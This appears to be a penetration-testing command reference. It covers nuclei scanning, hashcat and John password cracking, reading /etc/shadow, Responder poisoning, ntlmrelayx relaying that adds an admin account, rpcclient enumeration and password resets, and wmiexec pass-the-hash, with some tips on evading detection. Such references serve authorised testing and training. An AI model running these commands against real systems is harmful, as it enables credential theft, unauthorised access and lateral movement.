docs.text: nuclei -u https://10.10.10.10 -t http/api/graphql.yaml

docs.title: Running a Full Web Security Scan
docs.text: nuclei -u https://10.10.10.10 -t http/

docs.title: Scanning for CVEs in Web Applications
docs.text: nuclei -u https://10.10.10.10 -t cves/

docs.title: Finding Subdomains and Associated Services
docs.text: nuclei -u https://10.10.10.10 -t dns/

docs.title: Excluding False Positives
docs.text: nuclei -u https://10.10.10.10 -t http/ -exclude-severity info

docs.title: Saving Output to a File
docs.text: nuclei -u https://10.10.10.10 -t http/ -o results.txt

docs.title: Running Nuclei with Proxy for Stealth
docs.text: nuclei -u https://10.10.10.10 -proxy http://127.0.0.1:8080

docs.title: Running Nuclei on Subdomain Enumeration Results
docs.text: subfinder -d example.com -silent | nuclei -t http/

docs.title: Using Nuclei with FFuF for Parameter Fuzzing
docs.text: ffuf -w wordlist.txt -u https://10.10.10.10/FUZZ | nuclei -t http/

docs.title: Password Cracking
docs.text: Identify the hash type before cracking — hashid <hash> or paste into hash-identifier. Hashcat mode numbers must be exact; a wrong mode silently fails. Start with rockyou.txt + best64.rule before reaching for bigger wordlists or longer masks.

docs.title: Identify Hash Type
docs.text:
hashid '$6$salt$hash...'
hash-identifier

Common formats:

Prefix / Format Type Hashcat Mode 32 hex chars NTLM 1000 $1$ MD5crypt 500 $2a$, $2b$ bcrypt 3200 $5$ SHA-256crypt 7400 $6$ SHA-512crypt 1800 $krb5tgs$23$ Kerberoast (RC4) 13100 $krb5asrep$23$ AS-REP Roast 18200 $DCC2$ Domain Cached Credentials 2 2100 USERNAME::DOMAIN:... NTLMv2 (Responder) 5600 $apr1$ Apache MD5 1600

docs.title: Basic Wordlist Attack
docs.text: hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt

docs.title: Wordlist + Rules (Best Starting Point)
docs.text:
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

docs.title: Mask Attack (Pattern-Based)
docs.text:
# 8 chars: uppercase + 6 lowercase + 2 digits  (e.g., Password12)
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?d

# Corporate pattern: 6-char word + 4-digit year
hashcat -m 1000 hashes.txt -a 3 ?l?l?l?l?l?l?d?d?d?d
Mask Character Set ?l Lowercase a-z ?u Uppercase A-Z ?d Digits 0-9 ?s Symbols ?a All printable

docs.title: Combinator Attack
docs.text: hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt

docs.title: Resume a Session
docs.text:
hashcat --session crackjob -m 1000 hashes.txt rockyou.txt
hashcat --session crackjob --restore

docs.title: John the Ripper
docs.text:
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT --wordlist=rockyou.txt hashes.txt
john --show hashes.txt        # display cracked results

docs.title: CeWL — crawl a target and generate a custom wordlist
docs.text:
Useful when the target likely has a custom password policy (company name, product names):

cewl http://10.10.10.10 -d 3 -m 5 -o cewl-wordlist.txt
hashcat -m 1000 hashes.txt cewl-wordlist.txt -r best64.rule

docs.title: Crunch — pattern-based generation
docs.text: crunch 8 10 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt

docs.title: Linux /etc/shadow
docs.text:
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 1800 combined.txt rockyou.txt     # SHA-512crypt

docs.title: Responder – LLMNR/NBT-NS/MDNS Poisoning & Credential Capture
docs.text:
Tip

Run sudo responder -I tun0 -wrf as soon as you have internal network access — it passively captures NTLMv2 hashes from any misconfigured name resolution. Crack with hashcat -m 5600. If SMB signing is disabled on targets, relay with ntlmrelayx instead of cracking.

docs.title: Basic Usage
docs.text:
sudo responder -I tun0
  • -I tun0: Interface to bind to
  • -v: Verbose mode

docs.title: Recommended Usage
docs.text:
sudo responder -I tun0 -wrf
  • -w: Answer WPAD (Web Proxy Auto-Discovery) requests
  • -r: Respond to NetBIOS Name Service (NBT-NS) requests
  • -f: Respond to File/SMB requests

docs.title: Logs and Hashes
docs.text:
Responder writes captured hashes to:

Responder/logs/10.10.10.10-SMB-NTLMv2-<timestamp>.txt

docs.title: NTLMv1/NTLMv2 Format
docs.text:
USERNAME::DOMAIN:LMHASH:NTHASH:CHALLENGE:RESPONSE

Captured hashes can be cracked offline, relayed via ntlmrelayx, or injected with tools like pth-winexe, pth-smbclient.

docs.title: With Hashcat (NTLMv2 – Mode 5600)
docs.text: hashcat -m 5600 responder_hash.txt /usr/share/wordlists/rockyou.txt

docs.title: With John the Ripper
docs.text: john --format=netntlmv2 responder_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

docs.title: Extract Only the Hash
docs.text: cut -d ' ' -f 3 responder.log > responder_hashes.txt

docs.title: Disable SMB in Responder to Avoid Collision
docs.text: sudo responder -I tun0 -wrf --disable-smb

docs.title: Start ntlmrelayx
docs.text: sudo ntlmrelayx.py -tf targets.txt -smb2support

docs.title: Relay to SMB, Add Admin User
docs.text: sudo ntlmrelayx.py -tf targets.txt --no-smb-signing --add-user attacker --passwd 'P@ssw0rd123' --group 'Administrators'

docs.title: Supported Relay Targets
docs.text: Protocol Actions Available SMB File access, command exec, add user LDAP Dump domain info, modify AD objects HTTP Limited use; enumerate or exploit upload endpoints MSSQL Run SQL queries as authenticated user

docs.title: Advanced Configuration
docs.text:
Disable specific protocols in Responder.conf:

sudo nano /etc/responder/Responder.conf

[Responder Core]
SMB = Off
HTTP = On
FTP = Off
DNS = Off

Enable only what you need to avoid DoSing targets or triggering EDR.

docs.title: RPCClient — SMB/RPC Enumeration
docs.text:
Tip

Null session: rpcclient -U "" -N 10.10.10.10. Useful commands: enumdomusers (user list), queryuser <rid> (user details), enumdomgroups (group list). RID cycling: for i in $(seq 500 1100); do rpcclient -U "" -N 10.10.10.10 -c "queryuser $i" 2>/dev/null | grep "User Name"; done.

docs.title: Syntax
docs.text:
rpcclient -U <user>%<password> <target>

Examples:

rpcclient -U "guest%" 10.10.10.10
rpcclient -U "john%Winter2023!" 10.10.10.10
rpcclient -N 10.10.10.10             # Null session

Once connected, you'll drop into an interactive shell.

docs.title: 1. Enumerate Domain Users
docs.text:
enumdomusers

Output:

user:[Administrator] rid:[0x1f4]
user:[john] rid:[0x1f5]

To resolve a RID to a SID:

queryuser 0x1f4

docs.title: 2. Enumerate Domain Groups
docs.text:
enumdomgroups

Follow up with group info:

querygroup <RID>

docs.title: 3. SID Enumeration
docs.text:
Resolve a known SID:

lookupsids S-1-5-21-...-500

Brute-force SIDs for RID cycling:

for i in $(seq 500 550); do echo "S-1-5-21-XXXXXXX-XXXXXXX-XXXXXXX-$i" >> sids.txt; done
rpcclient -U "" 10.10.10.10 -c "lookupsids $(cat sids.txt)"

docs.title: 4. Enumerate Share Information
docs.text: netshareenum

docs.title: 5. Get Machine Info
docs.text:
getdompwinfo       # Domain password policy
getdcname .        # Domain Controller name
gethostname        # NetBIOS name of host

docs.title: 6. Dump Password Policy
docs.text:
getdompwinfo

Example output:

min password length: 7
password history length: 24
password properties: 0x00000000

docs.title: 7. Password Update
docs.text:
With appropriate credentials, update another user's password:

setuserinfo2 MOLLY.SMITH 23 'Password1!'

The 23 value is the info level for password change (maps to USER_INFO_23).

docs.title: Example Workflow (Unauthenticated Enumeration)
docs.text:
rpcclient -U "" 10.10.10.10
> enumdomusers
> enumdomgroups
> getdompwinfo
> netshareenum
> getdcname .
> queryuser 0x1f4

If null sessions are disabled, test with valid credentials:

rpcclient -U "lowpriv%Winter2023!" 10.10.10.10

docs.title: WMIExec
docs.text: impacket-wmiexec domain/user:pass@10.10.10.10 gives a semi-interactive shell. For pass-the-hash: -hashes :NTLM. WMI execution leaves fewer traces than PSExec but still generates Event ID 4688 (process creation).

docs.title: Basic Usage
docs.text:
impacket-wmiexec EXAMPLE/Administrator@10.10.10.10
impacket-wmiexec EXAMPLE/Administrator:'Password123'@10.10.10.10

docs.title: Pass-the-Hash
docs.text: impacket-wmiexec EXAMPLE/Administrator@10.10.10.10 -hashes :2892d26cdf84d7a70e2eb3b9f05c425e

docs.title: Execute Commands
docs.text:
impacket-wmiexec EXAMPLE/Administrator:'Password123'@10.10.10.10 "whoami"
impacket-wmiexec EXAMPLE/Administrator:'Password123'@10.10.10.10 "ipconfig /all"
impacket-wmiexec EXAMPLE/Administrator:'Password123'@10.10.10.10 "powershell -c Get-Process"
